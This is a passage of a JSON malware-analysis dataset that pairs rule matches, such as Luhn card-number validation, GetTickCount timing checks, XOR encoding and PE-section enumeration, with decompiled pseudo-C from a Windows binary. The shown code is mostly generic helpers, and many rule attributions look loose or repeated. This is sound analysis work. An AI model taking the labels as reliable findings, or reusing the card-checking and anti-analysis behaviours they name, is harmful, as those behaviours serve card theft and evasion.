            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004086a9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00407fdb(arg_8h, arg_ch, arg_10h, arg_ch, arg_ch);\n    return;\n}\n",
        "token_count": 66
    },
    "00408c97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nint32_t * fcn.00408c97(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t *arg_8h;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &stack0xffffffd0;\n    *(unaff_EBP + -0x14) = arg_8h;\n    *(unaff_EBP + -0x18) = 0;\n    fcn.00408129(arg_8h);\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x24) != '\\0') {\n        uVar3 = fcn.00401328(unaff_EBP + -0x1c);\n        *(unaff_EBP + -4) = 1;\n        fcn.004074b2(uVar3);\n        *(unaff_EBP + -4) = 0;\n        fcn.00401210();\n        *(unaff_EBP + -4) = 2;\n        iVar1 = *(*arg_8h + 4);\n        iVar2 = *(*arg_8h + 4);\n        *(unaff_EBP + -0x20) = *(arg_8h + iVar2 + 0x30);\n        uVar3 = *(arg_8h + iVar2 + 0x28);\n        *(unaff_EBP + -0x30) = 0;\n        pcVar4 = fcn.00404fbc(unaff_EBP + -0x30, *(unaff_EBP + -0x30), uVar3, iVar1 + arg_8h, *(unaff_EBP + -0x20), \n                              *(unaff_EBP + 8));\n        if (*pcVar4 != '\\0') {\n            *(unaff_EBP + -0x18) = 4;\n        }\n        *(unaff_EBP + -4) = 0;\n    }\n    fcn.00407731(*(unaff_EBP + -0x18), 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00408793();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return arg_8h;\n}\n",
        "token_count": 651
    },
    "004111e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004111e5(uint arg_8h)\n\n{\n    fcn.004110b9(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00411b96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00411baa)\n// WARNING: Removing unreachable block (ram,0x00411bb0)\n// WARNING: Removing unreachable block (ram,0x00411bb2)\n\nvoid fcn.00411b96(void)\n\n{\n    return;\n}\n",
        "token_count": 64
    },
    "00409a98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409a98(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040d598(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004090d3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004090d3(int32_t *param_1)\n\n{\n    if (*param_1 < 4) {\n        fcn.00409813(*param_1 * 0x18 + 0x4d22f8);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00406be7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406be7(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint var_10h;\n    \n    if (in_ECX != arg_8h) {\n        uVar1 = *(in_ECX + 4);\n        uVar2 = *(in_ECX + 8);\n        uVar3 = *(in_ECX + 0xc);\n        uVar4 = *(in_ECX + 0x10);\n        *(in_ECX + 4) = *(arg_8h + 4);\n        *(in_ECX + 8) = *(arg_8h + 8);\n        *(in_ECX + 0xc) = *(arg_8h + 0xc);\n        *(in_ECX + 0x10) = *(arg_8h + 0x10);\n        *(arg_8h + 4) = uVar1;\n        *(arg_8h + 8) = uVar2;\n        *(arg_8h + 0xc) = uVar3;\n        *(arg_8h + 0x10) = uVar4;\n        uVar1 = *(in_ECX + 0x14);\n        *(in_ECX + 0x14) = *(arg_8h + 0x14);\n        *(arg_8h + 0x14) = uVar1;\n        uVar1 = *(in_ECX + 0x18);\n        *(in_ECX + 0x18) = *(arg_8h + 0x18);\n        *(arg_8h + 0x18) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 389
    },
    "004071cc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n\nuint __cdecl fcn.004071cc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a0h;\n    uint var_2ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = 0;\n    piVar1 = *(unaff_EBP + 8);\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0040a0d1(0x18);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            uVar3 = fcn.00406d36(unaff_EBP + -0x2c);\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x10) = 1;\n            uVar3 = fcn.00406862(uVar3);\n            *(unaff_EBP + -4) = 2;\n            *(unaff_EBP + -0x10) = 3;\n            iVar2 = fcn.00406356(uVar3, 0, 1);\n        }\n        *(unaff_EBP + -4) = 4;\n        *piVar1 = iVar2;\n        *(unaff_EBP + -4) = 3;\n        if ((*(unaff_EBP + -0x10) & 2) != 0) {\n            *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) & 0xfffffffd;\n            fcn.004068ce();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if ((*(unaff_EBP + -0x10) & 1) != 0) {\n            *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) & 0xfffffffe;\n            fcn.00405fd6(1, 0);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return 4;\n}\n",
        "token_count": 563
    },
    "0040770a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040770a(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_8h != arg_ch) {\n        do {\n            arg_10h = arg_10h + -0x1c;\n            arg_ch = arg_ch + -0x1c;\n            fcn.00406be7(arg_ch);\n        } while (arg_ch != arg_8h);\n    }\n    return arg_10h;\n}\n",
        "token_count": 114
    },
    "00408e6d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e6d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = *(in_ECX + 0x10);\n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    uVar1 = fcn.00404fa6();\n    if ((arg_8h_00 - *(in_ECX + 0xc)) / 0x1c < uVar1) {\n        uVar2 = fcn.00408107(arg_8h_00, 1, arg_8h);\n        *(in_ECX + 0x10) = uVar2;\n    }\n    else {\n        fcn.00406322(arg_8h_00, in_ECX);\n        fcn.00408e03(&var_8h, var_8h, var_4h, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "004025d7": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004025d7(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        do {\n            uVar1 = fcn.004022f8();\n            *(iVar2 + param_1) = *(iVar2 + param_1) ^ uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < param_2);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "004073bc": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004073bc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    *(param_1 + 0x24) = 0;\n    *(param_1 + 4) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0x201;\n    *(param_1 + 0x14) = 6;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    fcn.004072af(0, 0);\n    iVar1 = fcn.0040a0d1(4);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.004011dd();\n    }\n    *(param_1 + 0x24) = uVar2;\n    return;\n}\n",
        "token_count": 238
    },
    "004077a4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004077a4(int32_t param_1)\n\n{\n    if (*(param_1 + 0xc) != 0) {\n        fcn.0040778b(*(param_1 + 0xc), *(param_1 + 0x10));\n        fcn.00409e64(*(param_1 + 0xc));\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 129
    },
    "0041b2b1": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041b2b1(void)\n\n{\n    *0x442074 = (*_sym.imp.KERNEL32.dll_CreateFileA)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "00405b7b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b7b(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    \n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    pcVar2 = pcVar2 + (1 - (arg_8h + 1));\n    pcVar3 = fcn.004096a4(pcVar2);\n    for (; pcVar2 != NULL; pcVar2 = pcVar2 + -1) {\n        *pcVar3 = *arg_8h;\n        pcVar3 = pcVar3 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00406b35": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406b35(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004069d6(arg_8h, pcVar2 - (arg_8h + 1));\n    return;\n}\n",
        "token_count": 109
    },
    "004072af": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_50h\n\nvoid __cdecl fcn.004072af(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_50h;\n    int32_t arg_8h_00;\n    uint in_stack_ffffffb8;\n    uint var_28h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    uVar1 = *(unaff_EBP + 8) & 0x17;\n    *(extraout_ECX + 8) = uVar1;\n    uVar1 = *(extraout_ECX + 0xc) & uVar1;\n    if (uVar1 == 0) {\n        *in_FS_OFFSET = *(unaff_EBP + -0xc);\n        return;\n    }\n    uVar2 = 0;\n    if (*(unaff_EBP + 0xc) == '\\0') goto code_r0x004072da;\n    in_stack_ffffffb8 = 0;\n    arg_8h_00 = 0;\n    do {\n        fcn.0040a136(arg_8h_00, in_stack_ffffffb8);\n        uVar1 = extraout_ECX_00;\ncode_r0x004072da:\n        if ((uVar1 & 4) == 0) {\n            uVar2 = 2;\n            if ((uVar1 & 2) == 0) {\n                fcn.00406eb6(\"ios_base::eofbit set\");\n                goto code_r0x004072ec;\n            }\n            fcn.00406eb6(\"ios_base::failbit set\");\n            *(unaff_EBP + -4) = 1;\n        }\n        else {\n            fcn.00406eb6(\"ios_base::badbit set\");\ncode_r0x004072ec:\n            *(unaff_EBP + -4) = uVar2;\n        }\n        fcn.00406e36(unaff_EBP + -0x28);\n        arg_8h_00 = unaff_EBP + -0x50;\n    } while( true );\n}\n",
        "token_count": 515
    },
    "004096a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004096a4(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStack16 [12];\n    \n    do {\n        iVar2 = fcn.0040d83c(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040e40c(param_1);\n    } while (iVar2 != 0);\n    if ((*0x4d251c & 1) == 0) {\n        *0x4d251c = *0x4d251c | 1;\n        fcn.0040a0b6();\n        fcn.0040b6f6(0x41c30a);\n    }\n    fcn.0040521e(0x4d2510);\n    fcn.0040a136(auStack16, 0x4208b4);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 224
    },
    "0040df8c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040df8c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0d8(0x421cf8, 0xc);\n    fcn.0040e5e0(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4d2560;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4d255c;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040dfd0;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040a18d(arg_8h_00);\ncode_r0x0040dfd0:\n        fcn.0040a18d(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040dff3();\n    fcn.0040f11d();\n    return;\n}\n",
        "token_count": 407
    }
}